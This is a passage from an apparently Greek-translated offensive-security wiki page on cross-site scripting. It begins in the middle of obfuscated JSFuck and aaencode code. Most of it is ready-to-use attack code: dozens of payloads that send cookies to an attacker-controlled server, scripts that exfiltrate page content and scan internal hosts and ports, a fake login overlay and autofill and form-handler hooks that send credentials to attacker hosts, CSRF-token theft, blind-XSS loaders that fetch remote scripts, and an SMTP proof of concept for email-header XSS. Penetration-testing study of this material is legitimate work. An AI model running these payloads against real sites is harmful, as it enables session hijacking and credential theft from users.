(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS κοινά payloads

### Πολλαπλά payloads σε 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Κάντε τον χρήστη να πλοηγηθεί στη σελίδα χωρίς να βγαίνει από ένα iframe και υποκλέψτε τις ενέργειές του (συμπεριλαμβανομένων των πληροφοριών που αποστέλλονται σε φόρμες):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Ανάκτηση Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Δεν θα μπορείτε να έχετε πρόσβαση στα cookies από το JavaScript αν η σημαία HTTPOnly είναι ρυθμισμένη στο cookie. Αλλά εδώ έχετε [μερικούς τρόπους για να παρακάμψετε αυτήν την προστασία](../hacking-with-cookies/index.html#httponly) αν είστε αρκετά τυχεροί.

### Κλοπή περιεχομένου σελίδας
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Βρείτε εσωτερικές IPs
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Σύντομοι χρόνοι υποδεικνύουν port που ανταποκρίνεται_ _Μεγαλύτεροι χρόνοι υποδεικνύουν καμία ανταπόκριση._

Ελέγξτε τη λίστα των ports που έχουν απαγορευτεί στο Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) και στο Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Πλαίσιο για αίτηση credentials
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Καταγραφή κωδικών από τη λειτουργία Auto-fill
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Όταν οποιαδήποτε δεδομένα εισαχθούν στο πεδίο password, το username και το password αποστέλλονται στον attackers server, ακόμα κι αν ο client επιλέξει ένα saved password και δεν πληκτρολογήσει τίποτα, τα credentials θα ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Αν ένας critical handler (π.χ. `function DoLogin(){...}`) δηλώνεται αργότερα στη σελίδα, και το payload σας τρέχει νωρίτερα (π.χ. μέσω inline JS-in-JS sink), ορίστε πρώτα ένα `const` με το ίδιο όνομα για να προλάβετε και να κλειδώσετε τον handler. Μετέπειτα δηλώσεις function δεν μπορούν να rebind ένα `const` όνομα, αφήνοντας το hook σας υπό έλεγχο:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Σημειώσεις
- Αυτό βασίζεται στη σειρά εκτέλεσης: το injection σου πρέπει να εκτελεστεί πριν από τη νόμιμη δήλωση.
- Αν το payload σου είναι τυλιγμένο σε `eval(...)`, οι `const/let` δεσμεύσεις δεν θα γίνουν globals. Χρησιμοποίησε τη δυναμική `<script>` injection τεχνική από την ενότητα “Deliverable payloads with eval(atob()) and scope nuances” για να εξασφαλίσεις ένα πραγματικό global, μη επαναδεσμεύσιμο binding.
- Όταν φίλτρα λέξεων-κλειδιών μπλοκάρουν τον κώδικα, συνδύασε με Unicode-escaped identifiers ή παροχή μέσω `eval(atob('...'))`, όπως φαίνεται παραπάνω.

### Keylogger

Απλώς ψάχνοντας στο github βρήκα μερικά διαφορετικά:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Μπορείς επίσης να χρησιμοποιήσεις metasploit `http_javascript_keylogger`

### Κλοπή CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Κλοπή μηνυμάτων PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Κατάχρηση Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Πρόσβαση στο Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Μπορείτε επίσης να χρησιμοποιήσετε: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Πρόσβαση σε Κρυφό Περιεχόμενο

Από [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) μπορεί κανείς να μάθει ότι ακόμα κι αν κάποιες τιμές εξαφανιστούν από το JS, εξακολουθεί να είναι δυνατό να τις βρει κανείς σε JS ιδιότητες μέσα σε διαφορετικά αντικείμενα. Για παράδειγμα, μια είσοδος σε REGEX εξακολουθεί να μπορεί να βρεθεί ακόμη και μετά την αφαίρεση της τιμής της εισόδου του regex:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Κατάχρηση άλλων vulnerabilities

### XSS σε Markdown

Μπορεί να εγχύσετε κώδικα Markdown που θα αποδοθεί; Ίσως να αποκτήσετε XSS! Δείτε:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Έχετε XSS σε έναν **ιστότοπο που χρησιμοποιεί caching**; Δοκιμάστε να το **αναβαθμίσετε σε SSRF** μέσω Edge Side Include Injection με αυτό το payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS σε δυναμικά δημιουργημένο PDF

If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.\
So, if the **PDF creator bot finds** some kind of **HTML** **tags**, it is going to **interpret** them, and you can **abuse** this behaviour to cause a **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

If you cannot inject HTML tags it could be worth it to try to **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, aimed at accelerating web page performance on mobile devices, incorporates HTML tags supplemented by JavaScript to ensure functionality with an emphasis on speed and security. It supports a range of components for various features, accessible via [AMP components](https://amp.dev/documentation/components/?format=websites).

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

The RFC 2369 `List-Unsubscribe` header embeds attacker-controlled URIs that many webmail and mail clients automatically convert into "Unsubscribe" buttons. When those URIs are rendered or fetched without validation, the header becomes an injection point for both stored XSS (if the unsubscribe link is placed in the DOM) and SSRF (if the server performs the unsubscribe request on behalf of the user).

#### Stored XSS via `javascript:` URIs

1. **Στείλε στον εαυτό σου ένα email** όπου το header δείχνει σε ένα `javascript:` URI, ενώ διατηρείς το υπόλοιπο μήνυμα αβλαβές ώστε τα spam φίλτρα να μην το απορρίψουν.
2. **Εξασφάλισε ότι το UI αποδίδει την τιμή** (πολλοί clients το εμφανίζουν σε ένα πλαίσιο "List Info") και έλεγξε αν το προκύπτον `<a>` tag κληρονομεί attacker-controlled attributes such as `href` or `target`.
3. **Προκάλεσε εκτέλεση** (π.χ. CTRL+click, middle-click, or "open in new tab") όταν ο σύνδεσμος χρησιμοποιεί `target="_blank"`; browsers will evaluate the supplied JavaScript in the origin of the webmail application.
4. Παρατήρησε το stored-XSS primitive: το payload παραμένει με το email και απαιτεί μόνο ένα κλικ για να εκτελεστεί.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Το byte νέας γραμμής (`%0a`) στο URI δείχνει ότι ακόμα και ασυνήθιστοι χαρακτήρες επιβιώνουν στο rendering pipeline σε ευάλωτους clients όπως το Horde IMP H5, που θα εμφανίσει τη συμβολοσειρά αυτολεξεί μέσα στην ετικέτα anchor.

<details>
<summary>Ελάχιστο SMTP PoC που παραδίδει έναν κακόβουλο List-Unsubscribe header</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Απευθείας proxy κατάργησης εγγραφής στην πλευρά του διακομιστή -> SSRF

